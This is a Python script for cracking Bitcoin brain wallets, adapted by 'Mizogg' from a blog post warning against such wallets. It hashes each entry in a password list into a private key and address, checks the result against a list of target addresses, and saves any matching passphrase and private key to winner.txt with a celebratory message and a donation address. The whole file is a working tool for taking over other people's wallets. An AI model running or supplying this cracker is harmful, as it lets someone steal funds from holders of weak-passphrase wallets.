# found this on https://mingze-gao.com/posts/never-use-a-brain-wallet/ 
#Edit and updated by Mizogg. 22/08/2021 
import codecs
import hashlib
import ecdsa
import winsound
frequency = 2500  # Set Frequency To 2500 Hertz
duration = 2500  # Set Duration To 1000 ms == 1 second
with open("list.txt", "r") as file:
    line_count = 0
    for line in file:
        line != "\n"
        line_count += 1
print('BRAIN WALLET PASSWORD LIST LOADING>>>>')
print('Total Password Loaded:', line_count)

mylist = []

with open('list.txt', newline='', encoding='utf-8') as f:
    for line in f:
        mylist.append(line.strip())

with open("btc.txt","r") as m:
    add = m.read().split()
add= set(add)

class BrainWallet:

    @staticmethod
    def generate_address_from_passphrase(passphrase):
        private_key = str(hashlib.sha256(
            passphrase.encode('utf-8')).hexdigest())
        address =  BrainWallet.generate_address_from_private_key(private_key)
        return private_key, address

    @staticmethod
    def generate_address_from_private_key(private_key):
        public_key = BrainWallet.__private_to_public(private_key)
        address = BrainWallet.__public_to_address(public_key)
        return address

    @staticmethod
    def __private_to_public(private_key):
        private_key_bytes = codecs.decode(private_key, 'hex')
        # Get ECDSA public key
        key = ecdsa.SigningKey.from_string(
            private_key_bytes, curve=ecdsa.SECP256k1).verifying_key
        key_bytes = key.to_string()
        key_hex = codecs.encode(key_bytes, 'hex')
        # Add bitcoin byte
        bitcoin_byte = b'04'
        public_key = bitcoin_byte + key_hex
        return public_key

    @staticmethod
    def __public_to_address(public_key):
        public_key_bytes = codecs.decode(public_key, 'hex')
        # Run SHA256 for the public key
        sha256_bpk = hashlib.sha256(public_key_bytes)
        sha256_bpk_digest = sha256_bpk.digest()
        # Run ripemd160 for the SHA256
        ripemd160_bpk = hashlib.new('ripemd160')
        ripemd160_bpk.update(sha256_bpk_digest)
        ripemd160_bpk_digest = ripemd160_bpk.digest()
        ripemd160_bpk_hex = codecs.encode(ripemd160_bpk_digest, 'hex')
        # Add network byte
        network_byte = b'00'
        network_bitcoin_public_key = network_byte + ripemd160_bpk_hex
        network_bitcoin_public_key_bytes = codecs.decode(
            network_bitcoin_public_key, 'hex')
        # Double SHA256 to get checksum
        sha256_nbpk = hashlib.sha256(network_bitcoin_public_key_bytes)
        sha256_nbpk_digest = sha256_nbpk.digest()
        sha256_2_nbpk = hashlib.sha256(sha256_nbpk_digest)
        sha256_2_nbpk_digest = sha256_2_nbpk.digest()
        sha256_2_hex = codecs.encode(sha256_2_nbpk_digest, 'hex')
        checksum = sha256_2_hex[:8]
        # Concatenate public key and checksum to get the address
        address_hex = (network_bitcoin_public_key + checksum).decode('utf-8')
        wallet = BrainWallet.base58(address_hex)
        return wallet

    @staticmethod
    def base58(address_hex):
        alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
        b58_string = ''
        # Get the number of leading zeros and convert hex to decimal
        leading_zeros = len(address_hex) - len(address_hex.lstrip('0'))
        # Convert hex to decimal
        address_int = int(address_hex, 16)
        # Append digits to the start of string
        while address_int > 0:
            digit = address_int % 58
            digit_char = alphabet[digit]
            b58_string = digit_char + b58_string
            address_int //= 58
        # Add '1' for each 2 leading zeros
        ones = leading_zeros // 2
        for one in range(ones):
            b58_string = '1' + b58_string
        return b58_string
count=0
password= line_count
for i in range(0,len(mylist)):
    count+=1
    password-=1
    passphrase = mylist[i]
    wallet = BrainWallet()
    private_key, address = wallet.generate_address_from_passphrase(passphrase)
    print('\nTotal Password Loaded:', line_count)
    print('Passphrase       : ',passphrase)
    print('Private Key      : ',private_key)
    print('Bitcoin Address  : ',address)
    print('Scan Number : ', count, ' : Remaing Passwords : ', password)
    if address in add:
        print ('\nCongraz you have found Bitcoin Passphrase ')
        print('Bitcoin Address  : ',address)
        print('Passphrase       : ',passphrase)
        print('Private Key      : ',private_key)
        f=open(u"winner.txt","a")
        f.write('\nBitcoin Address Compressed : ' + address)
        f.write('\nPassphrase       : '+ passphrase)
        f.write('\nPrivate Key      : '+ private_key)
        f.write('\n =====Made by mizogg.co.uk Donations 3M6L77jC3jNejsd5ZU1CVpUVngrhanb6cD =====' )
        f.close()
        winsound.Beep(frequency, duration)